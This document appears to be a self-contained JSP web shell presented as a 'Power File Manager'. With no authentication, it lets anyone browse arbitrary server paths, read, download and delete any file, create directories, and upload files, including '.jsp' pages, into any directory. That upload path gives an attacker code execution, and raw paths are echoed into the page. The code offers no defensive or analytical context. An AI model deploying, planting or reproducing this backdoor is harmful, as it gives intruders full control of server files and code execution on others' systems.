<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>

<%!
    // Configuration
    private static final String[] ALLOWED_UPLOAD_EXTENSIONS = {".txt", ".log", ".jsp", ".html", ".css", ".js", ".jpg", ".png", ".gif"};
    private static final long MAX_UPLOAD_SIZE = 10 * 1024 * 1024; // 10MB
    
    // Check if file extension is allowed for upload
    private boolean isAllowedExtension(String filename) {
        if (filename == null) return false;
        for (String ext : ALLOWED_UPLOAD_EXTENSIONS) {
            if (filename.toLowerCase().endsWith(ext)) {
                return true;
            }
        }
        return false;
    }
    
    // Format file size in human readable format
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%,.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }
%>

<%
    // Handle file upload
    if ("POST".equalsIgnoreCase(request.getMethod()) && 
        ServletFileUpload.isMultipartContent(request)) {
        
        DiskFileItemFactory factory = new DiskFileItemFactory();
        factory.setSizeThreshold(4096); // 4KB
        factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
        
        ServletFileUpload upload = new ServletFileUpload(factory);
        upload.setSizeMax(MAX_UPLOAD_SIZE);
        
        String uploadPath = request.getParameter("uploadPath");
        if (uploadPath == null) uploadPath = System.getProperty("user.dir");
        
        try {
            List<FileItem> items = upload.parseRequest(request);
            for (FileItem item : items) {
                if (!item.isFormField() && item.getSize() > 0) {
                    String fileName = new File(item.getName()).getName();
                    if (isAllowedExtension(fileName)) {
                        File storeFile = new File(uploadPath, fileName);
                        item.write(storeFile);
                    }
                }
            }
        } catch (Exception ex) {
            request.setAttribute("uploadError", "Upload failed: " + ex.getMessage());
        }
    }

    // Handle file operations
    String path = request.getParameter("path");
    if (path == null || path.trim().equals("")) {
        path = System.getProperty("user.dir");
    }

    File currentDir = new File(path);
    if (!currentDir.exists()) {
        currentDir = new File(System.getProperty("user.dir"));
    }

    // Handle file deletion
    String delFile = request.getParameter("delete");
    if (delFile != null) {
        File f = new File(delFile);
        if (f.exists()) {
            if (f.delete()) {
                request.setAttribute("operationMessage", "<span style='color:#0f0'>Deleted: " + f.getAbsolutePath() + "</span>");
            } else {
                request.setAttribute("operationMessage", "<span style='color:#f00'>Failed to delete: " + f.getAbsolutePath() + "</span>");
            }
        }
    }

    // Handle directory creation
    String newDir = request.getParameter("newDir");
    if (newDir != null && !newDir.trim().isEmpty()) {
        File dir = new File(currentDir, newDir);
        if (dir.mkdir()) {
            request.setAttribute("operationMessage", "<span style='color:#0f0'>Created directory: " + dir.getAbsolutePath() + "</span>");
        } else {
            request.setAttribute("operationMessage", "<span style='color:#f00'>Failed to create directory: " + dir.getAbsolutePath() + "</span>");
        }
    }

    // Handle file download
    String downloadFile = request.getParameter("download");
    if (downloadFile != null) {
        File f = new File(downloadFile);
        if (f.exists() && f.isFile()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
            Files.copy(f.toPath(), response.getOutputStream());
            response.getOutputStream().flush();
            return;
        }
    }

    File[] filesList = currentDir.listFiles();
    if (filesList == null) filesList = new File[0];
    
    // Sort files: directories first, then by name
    Arrays.sort(filesList, (f1, f2) -> {
        if (f1.isDirectory() && !f2.isDirectory()) return -1;
        if (!f1.isDirectory() && f2.isDirectory()) return 1;
        return f1.getName().compareToIgnoreCase(f2.getName());
    });
%>

<!DOCTYPE html>
<html>
<head>
    <title>Power File Manager</title>
    <style>
        body { 
            background-color: #000; 
            color: #ddd; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
        }
        .container { 
            width: 95%; 
            margin: 0 auto; 
            padding: 10px;
        }
        h1 { 
            color: #f00; 
            border-bottom: 1px solid #f00; 
            padding-bottom: 5px;
            margin-top: 0;
        }
        .path-nav { 
            background-color: #111; 
            padding: 10px; 
            margin-bottom: 10px;
            border: 1px solid #333;
        }
        .path-input { 
            width: 70%; 
            padding: 5px; 
            background-color: #222; 
            color: #fff; 
            border: 1px solid #f00;
        }
        .action-button { 
            background-color: #f00; 
            color: #fff; 
            border: none; 
            padding: 5px 10px; 
            cursor: pointer;
            margin: 0 2px;
        }
        .action-button:hover { 
            background-color: #c00;
        }
        .file-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 10px;
        }
        .file-table th { 
            background-color: #f00; 
            color: #000; 
            padding: 8px; 
            text-align: left;
        }
        .file-table td { 
            padding: 6px; 
            border-bottom: 1px solid #333;
        }
        .file-table tr:hover { 
            background-color: #222;
        }
        .dir-link { 
            color: #f88; 
            font-weight: bold;
        }
        .file-link { 
            color: #88f;
        }
        .operation-panel { 
            background-color: #111; 
            padding: 10px; 
            margin: 10px 0; 
            border: 1px solid #333;
        }
        .upload-form { 
            margin-top: 10px;
        }
        .file-content { 
            background-color: #111; 
            padding: 10px; 
            margin: 10px 0; 
            border: 1px solid #333;
            white-space: pre-wrap;
            font-family: monospace;
            max-height: 500px;
            overflow: auto;
        }
        .breadcrumb { 
            color: #ddd;
            margin-bottom: 5px;
        }
        .breadcrumb a { 
            color: #f88; 
            text-decoration: none;
        }
        .breadcrumb a:hover { 
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Power File Manager</h1>
        
        <% if (request.getAttribute("operationMessage") != null) { %>
            <div class="operation-panel"><%= request.getAttribute("operationMessage") %></div>
        <% } %>
        
        <% if (request.getAttribute("uploadError") != null) { %>
            <div class="operation-panel" style="color:#f00;"><%= request.getAttribute("uploadError") %></div>
        <% } %>
        
        <div class="path-nav">
            <form method="GET">
                <input type="text" name="path" value="<%= currentDir.getAbsolutePath() %>" class="path-input">
                <input type="submit" value="Go" class="action-button">
            </form>
            
            <div class="breadcrumb">
                <% 
                String[] parts = currentDir.getAbsolutePath().split(File.separator);
                StringBuilder currentPath = new StringBuilder();
                if (File.separator.equals("\\")) {
                    currentPath.append(parts[0]); // Drive letter on Windows
                } else {
                    currentPath.append(File.separator);
                }
                %>
                <a href="?path=<%= currentPath.toString() %>">Root</a>
                <% 
                for (int i = 1; i < parts.length; i++) {
                    if (!parts[i].isEmpty()) {
                        currentPath.append(File.separator).append(parts[i]);
                %>
                    &raquo; <a href="?path=<%= currentPath.toString() %>"><%= parts[i] %></a>
                <%
                    }
                }
                %>
            </div>
            
            <div class="operation-panel">
                <form method="GET" style="display:inline;">
                    <input type="hidden" name="path" value="<%= currentDir.getAbsolutePath() %>">
                    <input type="text" name="newDir" placeholder="New directory name" style="padding:5px; background-color:#222; color:#fff; border:1px solid #f00;">
                    <input type="submit" value="Create Directory" class="action-button">
                </form>
                
                <form method="POST" enctype="multipart/form-data" class="upload-form">
                    <input type="hidden" name="uploadPath" value="<%= currentDir.getAbsolutePath() %>">
                    <input type="file" name="file" style="padding:5px; background-color:#222; color:#fff; border:1px solid #f00;">
                    <input type="submit" value="Upload File" class="action-button">
                </form>
            </div>
        </div>
        
        <table class="file-table">
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
            
            <% if (!currentDir.getParentFile().equals(null)) { %>
                <tr>
                    <td colspan="5"><a href="?path=<%= currentDir.getParentFile().getAbsolutePath() %>" class="dir-link">[Parent Directory]</a></td>
                </tr>
            <% } %>
            
            <% for (File file : filesList) { %>
                <tr>
                    <td>
                        <% if (file.isDirectory()) { %>
                            <a href="?path=<%= file.getAbsolutePath() %>" class="dir-link">[DIR] <%= file.getName() %></a>
                        <% } else { %>
                            <a href="?path=<%= currentDir.getAbsolutePath() %>&view=<%= file.getAbsolutePath() %>" class="file-link"><%= file.getName() %></a>
                        <% } %>
                    </td>
                    <td><%= file.isFile() ? formatFileSize(file.length()) : "-" %></td>
                    <td><%= new Date(file.lastModified()) %></td>
                    <td>
                        <%= file.canRead() ? "R" : "-" %>
                        <%= file.canWrite() ? "W" : "-" %>
                        <%= file.canExecute() ? "X" : "-" %>
                    </td>
                    <td>
                        <% if (file.isFile()) { %>
                            <a href="?path=<%= currentDir.getAbsolutePath() %>&view=<%= file.getAbsolutePath() %>" class="action-button">View</a>
                            <a href="?path=<%= currentDir.getAbsolutePath() %>&download=<%= file.getAbsolutePath() %>" class="action-button">Download</a>
                            <a href="?path=<%= currentDir.getAbsolutePath() %>&delete=<%= file.getAbsolutePath() %>" class="action-button" onclick="return confirm('Delete <%= file.getName() %>?')">Delete</a>
                        <% } else { %>
                            <a href="?path=<%= currentDir.getAbsolutePath() %>&delete=<%= file.getAbsolutePath() %>" class="action-button" onclick="return confirm('Delete directory <%= file.getName() %> and all its contents?')">Delete</a>
                        <% } %>
                    </td>
                </tr>
            <% } %>
        </table>
        
        <% 
        // View file content
        String viewFile = request.getParameter("view");
        if (viewFile != null) {
            File f = new File(viewFile);
            if (f.exists() && f.isFile()) { 
        %>
            <div class="file-content">
                <h3>Viewing: <%= f.getName() %> (<%= formatFileSize(f.length()) %>)</h3>
                <%
                BufferedReader br = new BufferedReader(new FileReader(f));
                String line;
                while ((line = br.readLine()) != null) {
                    out.println(line.replace("<", "&lt;").replace(">", "&gt;"));
                }
                br.close();
                %>
            </div>
        <%
            }
        }
        %>
    </div>
</body>
</html>
